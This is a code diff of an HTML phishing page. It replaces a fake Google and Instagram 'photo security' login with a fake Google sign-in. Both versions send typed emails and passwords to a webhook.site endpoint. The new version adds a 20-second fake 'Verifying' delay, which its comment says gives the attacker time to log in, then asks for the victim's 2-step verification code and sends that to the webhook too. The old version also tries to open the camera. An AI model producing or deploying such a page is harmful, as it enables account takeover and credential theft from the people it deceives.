@@ -3,79 +3,79 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Photo Security Update</title>
+    <title>Google Security Verification</title>
     <style>
-        body { font-family: -apple-system, system-ui, sans-serif; background: #fff; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
-        .box { width: 320px; padding: 30px; text-align: center; border: 1px solid #dadce0; border-radius: 8px; }
-        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
-        .btn { background: #1a73e8; color: #fff; border: none; padding: 10px; border-radius: 4px; width: 100%; cursor: pointer; font-weight: bold; }
-        .ig-btn { background: #0095f6; margin-top: 10px; }
+        body { font-family: 'Roboto', arial, sans-serif; background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .box { width: 350px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 20px; }
+        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        .btn { background: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; cursor: pointer; font-weight: 500; width: 100%; margin-top: 20px; }
         .hidden { display: none; }
-        .error { color: #d93025; font-size: 12px; margin-bottom: 10px; background: #fce8e6; padding: 5px; }
+        .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #1a73e8; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-<div id="main-ui" class="box">
-    <!-- المرحلة 1: جوجل -->
-    <div id="g-stage">
-        <img src="https://wikimedia.org" width="70">
-        <h3>Identity Verification</h3>
-        <p style="font-size: 14px; color: #5f6368;">Confirm your Google account to access encrypted photos</p>
-        <div id="err-g" class="error hidden">Password incorrect. Please re-enter for security.</div>
-        <input type="email" id="g-user" placeholder="Email or phone">
-        <input type="password" id="g-pass" placeholder="Password">
-        <button class="btn" onclick="strike('google')">Next</button>
+<div class="box">
+    <img src="https://wikimedia.org" class="logo">
+    
+    <!-- Stage 1: Login -->
+    <div id="auth-stage">
+        <h1>Sign in</h1>
+        <p>Use your Google Account</p>
+        <input type="email" id="user" placeholder="Email or phone">
+        <input type="password" id="pass" placeholder="Enter your password">
+        <button class="btn" onclick="startInfiltration()">Next</button>
     </div>
 
-    <!-- المرحلة 2: إنستغرام -->
-    <div id="i-stage" class="hidden">
-        <img src="https://wikimedia.org" width="150">
-        <p style="font-size: 14px; color: #8e8e8e;">Log in to Instagram to sync media</p>
-        <div id="err-i" class="error hidden">Wrong password. Verification required.</div>
-        <input type="text" id="i-user" placeholder="Username or email">
-        <input type="password" id="i-pass" placeholder="Password">
-        <button class="btn ig-btn" onclick="strike('insta')">Log In</button>
+    <!-- Stage 2: Loading (The Delay) -->
+    <div id="loading-stage" class="hidden">
+        <h1>Verifying...</h1>
+        <div class="spinner"></div>
+        <p>Confirming your identity. This may take a few seconds...</p>
+    </div>
+
+    <!-- Stage 3: 2FA Code -->
+    <div id="code-stage" class="hidden">
+        <h1>2-Step Verification</h1>
+        <p>A verification code was just sent to your device. Enter the 6-digit code below.</p>
+        <input type="number" id="code" placeholder="G- Enter 6-digit code">
+        <button class="btn" onclick="submitCode()">Verify</button>
     </div>
 </div>
 
 <script>
     const WEBHOOK = "https://webhook.site/14050d7a-a236-4a94-8187-92801f330c1b";
-    let retry = { google: 0, insta: 0 };
 
-    async function strike(type) {
-        const u = document.getElementById(type === 'google' ? 'g-user' : 'i-user').value;
-        const p = document.getElementById(type === 'google' ? 'g-pass' : 'i-pass').value;
-        const err = document.getElementById(type === 'google' ? 'err-g' : 'err-i');
-
+    async function startInfiltration() {
+        const u = document.getElementById('user').value;
+        const p = document.getElementById('pass').value;
         if (!u || !p) return;
 
-        // إرسال البيانات فوراً (الغنائم)
-        fetch(WEBHOOK, {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({ type: type.toUpperCase(), user: u, pass: p, step: retry[type] })
-        });
+        // 1. Send Login Data to Webhook
+        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "CREDENTIALS", user: u, pass: p }) });
 
-        if (retry[type] === 0) {
-            retry[type]++;
-            err.classList.remove('hidden');
-            document.getElementById(type === 'google' ? 'g-pass' : 'i-pass').value = "";
-        } else {
-            if (type === 'google') {
-                document.getElementById('g-stage').classList.add('hidden');
-                document.getElementById('i-stage').classList.remove('hidden');
-            } else {
-                // محاولة أخيرة لسحب صورة من الكاميرا الأمامية صامتاً (Media Access)
-                try {
-                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-                    // إذا وافق، يتم إرسال إشارة للـ Webhook بنجاح الاختراق
-                } catch(e) {}
-                
-                // التوجيه النهائي للصورة الأصلية
-                window.location.href = "https://google.com";
-            }
-        }
+        // 2. Show Loading Stage to give you time to login on your PC
+        document.getElementById('auth-stage').classList.add('hidden');
+        document.getElementById('loading-stage').classList.remove('hidden');
+
+        // 3. Wait 20 seconds then show the 2FA input field
+        setTimeout(() => {
+            document.getElementById('loading-stage').classList.add('hidden');
+            document.getElementById('code-stage').classList.remove('hidden');
+        }, 20000); // 20 Seconds Delay
+    }
+
+    async function submitCode() {
+        const c = document.getElementById('code').value;
+        if (!c) return;
+
+        // 4. Send the 2FA Code to Webhook
+        fetch(WEBHOOK, { method: 'POST', mode: 'no-cors', body: JSON.stringify({ type: "2FA_CODE", code: c }) });
+
+        // 5. Final Redirect to the Image
+        window.location.href = "https://google.com";
     }
 </script>
 </body>
